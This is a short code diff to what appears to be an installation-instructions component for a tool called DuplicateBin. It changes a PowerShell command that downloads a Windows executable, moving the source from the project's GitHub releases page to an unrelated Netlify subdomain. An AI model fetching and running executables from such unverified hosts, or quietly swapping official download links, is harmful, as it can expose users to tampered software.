@@ -34,7 +34,7 @@ export function CLIInstallationSection() {
     {
       id: 'download',
       label: 'Download Windows executable',
-      command: 'Invoke-WebRequest -Uri "https://github.com/MustafaPinjari/duplicate-bin/releases/download/v0.1.1/DuplicateBin.exe" -OutFile "DuplicateBin.exe"'
+      command: 'Invoke-WebRequest -Uri "https://fanciful-shortbread-d39145.netlify.app/public/DuplicateBin.exe" -OutFile "DuplicateBin.exe"'
     },
     {
       id: 'run-gui',
